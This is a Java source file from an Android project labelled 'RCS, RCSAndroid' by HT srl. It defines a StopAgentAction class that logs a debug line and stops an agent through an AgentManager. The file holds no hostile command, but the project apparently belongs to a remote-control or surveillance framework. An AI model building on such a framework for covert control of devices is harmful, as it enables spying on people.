/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : StopAgentAction.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.action;

import android.util.Log;

import com.ht.RCSAndroidGUI.agent.AgentManager;

public class StopAgentAction extends AgentAction {
	public StopAgentAction(SubActionType type, byte[] confParams) {
		super(type, confParams);
	}

	private static final String TAG = "StopAgentAction";

	@Override
	public boolean execute() {
		Log.d("QZ", TAG + " (execute): " + agentId);
		final AgentManager agentManager = AgentManager.self();

		agentManager.stop(agentId);
		return true;
	}

}
